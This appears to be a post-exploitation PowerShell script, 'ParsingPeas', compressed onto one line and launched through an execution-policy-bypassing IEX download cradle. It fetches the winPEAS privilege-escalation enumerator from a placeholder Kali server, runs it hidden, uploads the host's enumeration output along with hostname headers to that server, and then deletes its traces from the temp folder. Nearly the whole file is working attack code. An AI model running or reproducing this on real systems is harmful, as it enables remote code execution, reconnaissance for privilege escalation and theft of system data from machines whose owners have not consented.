# Inline wrapper - execute with: powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://SERVER/wrapper-inline.ps1')"
$S='KALI_SERVER_URL';$E='Stop';$ErrorActionPreference=$E;$I=$true;try{if([Console]::WindowHeight -eq 0){$I=$false}}catch{$I=$false};function W($M){if($I){Write-Host $M}else{Write-Output $M}};function C($M,$Cl){if($I){Write-Host $M -F $Cl}else{Write-Output $M}};$SI="s_$(Get-Date -F 'yyyyMMdd_HHmmss')_$PID";$H=$env:COMPUTERNAME;if(!$H){$H='u'};$T="$env:TEMP\.wp_$(Get-Date -F 'yyyyMMdd_HHmmss').tmp";C '[*] ParsingPeas' 'Cyan';C "[*] Session: $SI" 'Cyan';C "[*] Host: $H" 'Cyan';C "[*] Server: $S" 'Cyan';W '';C '[*] Downloading winpeas...' 'Yellow';try{$WC=New-Object System.Net.WebClient;$WC.DownloadFile("$S/get-winpeas","$env:TEMP\wp.exe");$WC.Dispose()}catch{C "[!] Download failed: $_" 'Red';exit 1};if(!(Test-Path "$env:TEMP\wp.exe")){C '[!] Download failed' 'Red';exit 1};C '[+] Downloaded' 'Green';C '[*] Running winpeas...' 'Yellow';C '[*] May appear stuck for 30-60s during enumeration' 'Yellow';W '';[IO.File]::WriteAllText($T,'');$FS=[IO.File]::Open($T,[IO.FileMode]::Append,[IO.FileAccess]::Write,[IO.FileShare]::ReadWrite);$SW=New-Object IO.StreamWriter($FS);$SW.AutoFlush=$true;try{$P=New-Object Diagnostics.ProcessStartInfo;$P.FileName="$env:TEMP\wp.exe";$P.RedirectStandardOutput=$true;$P.RedirectStandardError=$true;$P.UseShellExecute=$false;$P.CreateNoWindow=$true;$Pr=New-Object Diagnostics.Process;$Pr.StartInfo=$P;$Pr.Start()|Out-Null;C "[*] Running (PID: $($Pr.Id))..." 'Yellow';$O=New-Object Text.StringBuilder;$Er=New-Object Text.StringBuilder;$OH={if($EventArgs.Data -ne $null){$L=$EventArgs.Data;[void]$Event.MessageData.SB.AppendLine($L);try{$Event.MessageData.W.WriteLine($L)}catch{}}};$EH={if($EventArgs.Data -ne $null){[void]$Event.MessageData.AppendLine($EventArgs.Data)}};$OD=@{SB=$O;W=$SW};$OE=Register-ObjectEvent -InputObject $Pr -EventName OutputDataReceived -Action $OH -MessageData $OD;$EE=Register-ObjectEvent -InputObject $Pr -EventName ErrorDataReceived -Action $EH -MessageData $Er;$Pr.BeginOutputReadLine();$Pr.BeginErrorReadLine();$St=Get-Date;$Lu=$St;$LastSz=0;$SC=0;while(!$Pr.HasExited){$N=Get-Date;$El=[Math]::Round(($N-$St).TotalSeconds);$CurSz=0;if(Test-Path $T){try{$CurSz=(Get-Item $T).Length}catch{$CurSz=$LastSz}};$Kb=[Math]::Round($CurSz/1KB,1);if($CurSz -eq $LastSz){$SC++}else{$SC=0};if(!$I){if(($N-$Lu).TotalSeconds -ge 10){if($SC -ge 20){W "[*] Running... $El sec | Output: $Kb KB (enumerating...)"}else{W "[*] Running... $El sec | Output: $Kb KB"};$Lu=$N}}else{$M=[Math]::Floor($El/60);$Sec=$El%60;if($SC -ge 20){Write-Host "`r[*] Running: $M`:$($Sec.ToString('00')) | Output: $Kb KB (enumerating...)" -NoNewline -F Yellow}else{Write-Host "`r[*] Running: $M`:$($Sec.ToString('00')) | Output: $Kb KB" -NoNewline -F Cyan}};$LastSz=$CurSz;Start-Sleep -M 500};$Pr.WaitForExit();$Ex=$Pr.ExitCode;$SW.Close();$SW.Dispose();$FS.Close();$FS.Dispose();$FinalSz=0;if(Test-Path $T){$FinalSz=(Get-Item $T).Length};$FinalKb=[Math]::Round($FinalSz/1KB,1);Unregister-Event -SourceIdentifier $OE.Name;Unregister-Event -SourceIdentifier $EE.Name;Remove-Job -Id $OE.Id -Force;Remove-Job -Id $EE.Id -Force;if($I){Write-Host "`r[+] Complete! | Output: $FinalKb KB" -NoNewline -F Green};W '';W '';$Err=$Er.ToString();if($Err){[IO.File]::AppendAllText($T,"`n`n=== STDERR ===`n"+$Err)};C "[+] Complete (exit: $Ex)" 'Green'}catch{C "[!] Error: $_" 'Red';try{if($SW){$SW.Dispose()};if($FS){$FS.Dispose()}}catch{};exit 1};if(!(Test-Path $T)){C '[!] No output' 'Red';exit 1};$Sz=(Get-Item $T).Length;C "[+] Size: $([Math]::Round($Sz/1KB,2)) KB" 'Green';W '';C '[*] Calculating checksum...' 'Yellow';try{$MD5=New-Object Security.Cryptography.MD5CryptoServiceProvider;$Fb=[IO.File]::ReadAllBytes($T);$Hash=$MD5.ComputeHash($Fb);$Cksum=[BitConverter]::ToString($Hash).Replace('-','').ToLower();C "[+] MD5 Checksum: $Cksum" 'Green'}catch{C '[!] Warning: Could not calculate checksum' 'Yellow';$Cksum='unknown'};W '';C '[*] Preparing upload...' 'Yellow';C '[*] Testing connection...' 'Yellow';try{$TC=New-Object System.Net.WebClient;$TC.DownloadString("$S/health")|Out-Null;$TC.Dispose();C '[+] Connection OK' 'Green'}catch{C '[!] Warning: Cannot reach server' 'Yellow'};C '[*] Uploading...' 'Yellow';W '';$Mr=3;$Rc=0;$Su=$false;while($Rc -lt $Mr -and !$Su){C "[*] Attempt $($Rc+1)/$Mr" 'Yellow';try{$WC=New-Object System.Net.WebClient;$WC.Headers.Add('X-Session-ID',$SI);$WC.Headers.Add('X-Hostname',$H);$WC.Headers.Add('X-Scan-Type','winpeas');$WC.Headers.Add('X-Client-Checksum',$Cksum);$WC.Headers.Add('Content-Type','text/plain');C '[*] Reading...' 'Cyan';$Fb=[IO.File]::ReadAllBytes($T);C "[+] Read $($Fb.Length) bytes" 'Green';C "[*] Uploading to $S/upload ..." 'Cyan';$Rb=$WC.UploadData("$S/upload",'POST',$Fb);$Rt=[Text.Encoding]::UTF8.GetString($Rb);C '[+] Upload complete!' 'Green';C '[+] Success!' 'Green';try{if($Rt -match '"report_url"\s*:\s*"([^"]+)"'){$Ru=$matches[1];C "[+] Report: $S$Ru" 'Green'};if($Rt -match '"checksum"\s*:\s*"([^"]+)"'){$SCk=$matches[1];if($SCk -eq $Cksum){C '[+] Checksum verified: Match!' 'Green'}else{C "[!] Checksum mismatch! Client: $Cksum | Server: $SCk" 'Red'}}}catch{};$WC.Dispose();$Su=$true}catch{$Rc++;C '[!] Failed' 'Red';C "[!] Error: $_" 'Red';if($Rc -lt $Mr){C '[*] Retry in 2s...' 'Yellow';Start-Sleep -S 2}}};W '';if($Su){C '[+] Cleaning...' 'Green';Remove-Item "$env:TEMP\wp.exe" -Force -EA SilentlyContinue;Remove-Item $T -Force -EA SilentlyContinue;C '[+] Done!' 'Green';exit 0}else{C '[!] Failed after retries' 'Red';C "[*] Output at: $T" 'Yellow';C "[*] MD5 Checksum: $Cksum" 'Yellow';exit 1}
